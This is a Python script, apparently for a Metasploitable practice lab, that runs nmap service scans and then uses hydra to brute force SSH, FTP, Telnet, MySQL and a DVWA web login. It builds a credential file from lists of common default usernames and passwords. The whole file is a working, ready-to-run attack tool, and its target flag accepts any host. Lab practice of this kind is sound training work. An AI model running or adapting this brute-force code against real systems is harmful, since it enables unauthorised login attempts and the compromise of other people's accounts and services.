#!/usr/bin/env python3
"""
Metasploitable Testing Script - Focuses on automated brute force testing
against common services in the Metasploitable container.

For educational purposes only. Use responsibly and only against systems you own.
"""
import subprocess
import argparse
import os
import time
import sys
import socket

# Default target info - adjust if you change port mappings in docker-compose.yml
DEFAULT_TARGET = "localhost"
SERVICES = {
    "ssh": 22,
    "ftp": 21,
    "telnet": 23,
    "http": 80,
    "mysql": 3306
}

# Common username/password combinations found in Metasploitable
COMMON_USERS = ["msfadmin", "user", "postgres", "service", "dbadmin", "tomcat", "sys", "klog", "root"]
COMMON_PASSWORDS = ["msfadmin", "password", "s3cr3t", "postgres", "service", "12345", "123456", "admin"]

def check_prerequisites():
    """Check if required tools are installed"""
    tools = ["nmap", "hydra"]
    missing = []
    
    for tool in tools:
        try:
            subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except subprocess.CalledProcessError:
            missing.append(tool)
    
    if missing:
        print(f"[!] Missing required tools: {', '.join(missing)}")
        print("[!] Please install them before running this script.")
        print("    On Debian/Ubuntu: sudo apt install -y " + " ".join(missing))
        return False
    return True

def is_port_open(host, port):
    """Check if a port is open using a socket connection"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0

def scan_target(target):
    """Scan target with nmap to identify open ports and services"""
    print(f"[+] Scanning {target} for open ports and services...")
    
    # Convert SERVICES dict to port list for scanning
    ports = ",".join(str(port) for port in SERVICES.values())
    
    # Run nmap scan
    command = ["nmap", "-sV", "--open", "-p", ports, target]
    result = subprocess.run(command, capture_output=True, text=True)
    
    print(result.stdout)
    return result.stdout

def create_credentials_file():
    """Create a temporary file with username:password combinations"""
    import tempfile
    
    cred_file = tempfile.NamedTemporaryFile(delete=False, mode='w')
    
    # Write common Metasploitable creds
    cred_file.write("msfadmin:msfadmin\n")  # Most common default
    
    # Write additional combinations
    for user in COMMON_USERS:
        for password in COMMON_PASSWORDS:
            cred_file.write(f"{user}:{password}\n")
    
    cred_file.close()
    return cred_file.name

def brute_force_ssh(target, port=22):
    """Brute force SSH service"""
    print(f"[+] Attempting SSH brute force against {target}:{port}")
    
    cred_file = create_credentials_file()
    
    # Fixed command syntax - Use service://server format
    command = [
        "hydra", 
        "-C", cred_file,
        "-t", "4",  # Number of threads
        "-f",  # Stop after finding a valid login
        f"ssh://{target}:{port}"  # Proper service URL format
    ]
    
    print(f"[i] Running command: {' '.join(command)}")
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout)
    
    os.unlink(cred_file)  # Clean up temp file
    return result.stdout

def brute_force_ftp(target, port=21):
    """Brute force FTP service"""
    print(f"[+] Attempting FTP brute force against {target}:{port}")
    
    cred_file = create_credentials_file()
    
    # Fixed command syntax - Use service://server format
    command = [
        "hydra", 
        "-C", cred_file,
        "-t", "4",  # Number of threads
        "-f",  # Stop after finding a valid login
        f"ftp://{target}:{port}"  # Proper service URL format
    ]
    
    print(f"[i] Running command: {' '.join(command)}")
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout)
    
    os.unlink(cred_file)  # Clean up temp file
    return result.stdout

def brute_force_web(target, port=80, uri="/dvwa/login.php"):
    """Brute force web login forms"""
    print(f"[+] Attempting Web login brute force against {target}:{port}{uri}")
    
    cred_file = create_credentials_file()
    
    # Fixed command syntax - Use proper service://server format with module parameters
    command = [
        "hydra", 
        "-C", cred_file,
        "-t", "4",
        "-f",
        f"http-post-form://{target}:{port}{uri}:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
    ]
    
    print(f"[i] Running command: {' '.join(command)}")
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout)
    
    os.unlink(cred_file)  # Clean up temp file
    return result.stdout

def brute_force_mysql(target, port=3306):
    """Brute force MySQL service"""
    print(f"[+] Attempting MySQL brute force against {target}:{port}")
    
    cred_file = create_credentials_file()
    
    # Fixed command syntax - Use service://server format
    command = [
        "hydra", 
        "-C", cred_file,
        "-t", "4",  # Number of threads
        "-f",  # Stop after finding a valid login
        f"mysql://{target}:{port}"  # Proper service URL format
    ]
    
    print(f"[i] Running command: {' '.join(command)}")
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout)
    
    os.unlink(cred_file)  # Clean up temp file
    return result.stdout

def brute_force_telnet(target, port=23):
    """Brute force Telnet service"""
    print(f"[+] Attempting Telnet brute force against {target}:{port}")
    
    cred_file = create_credentials_file()
    
    # Fixed command syntax - Use service://server format
    command = [
        "hydra", 
        "-C", cred_file,
        "-t", "4",  # Number of threads
        "-f",  # Stop after finding a valid login
        f"telnet://{target}:{port}"  # Proper service URL format
    ]
    
    print(f"[i] Running command: {' '.join(command)}")
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout)
    
    os.unlink(cred_file)  # Clean up temp file
    return result.stdout

def main():
    parser = argparse.ArgumentParser(description="Metasploitable Testing Script")
    parser.add_argument("--target", "-t", default=DEFAULT_TARGET, help=f"Target IP (default: {DEFAULT_TARGET})")
    parser.add_argument("--service", "-s", choices=["all"] + list(SERVICES.keys()), default="all", 
                       help="Service to test (default: all)")
    parser.add_argument("--scan-only", action="store_true", help="Only scan, don't perform attacks")
    args = parser.parse_args()
    
    # Check prerequisites
    if not check_prerequisites():
        sys.exit(1)
    
    # Scan target
    scan_results = scan_target(args.target)
    
    if args.scan_only:
        print("[+] Scan completed. Exiting as --scan-only was specified.")
        sys.exit(0)
    
    # If service is "all", test all services that are open
    if args.service == "all":
        services_to_test = []
        for service, port in SERVICES.items():
            if is_port_open(args.target, port):
                services_to_test.append(service)
        
        if not services_to_test:
            print("[!] No open services found to test.")
            sys.exit(1)
            
        print(f"[+] Testing services: {', '.join(services_to_test)}")
    else:
        # Test only the specified service
        services_to_test = [args.service]
    
    # Perform attacks on selected services
    for service in services_to_test:
        port = SERVICES[service]
        if not is_port_open(args.target, port):
            print(f"[!] {service.upper()} port {port} is not open. Skipping.")
            continue
            
        if service == "ssh":
            brute_force_ssh(args.target, port)
        elif service == "ftp":
            brute_force_ftp(args.target, port)
        elif service == "http":
            brute_force_web(args.target, port)
        elif service == "mysql":
            brute_force_mysql(args.target, port)
        elif service == "telnet":
            brute_force_telnet(args.target, port)  # Added telnet implementation
        
        # Small pause between attacks
        time.sleep(1)
    
    print("[+] All tests completed.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user.")
        sys.exit(1)
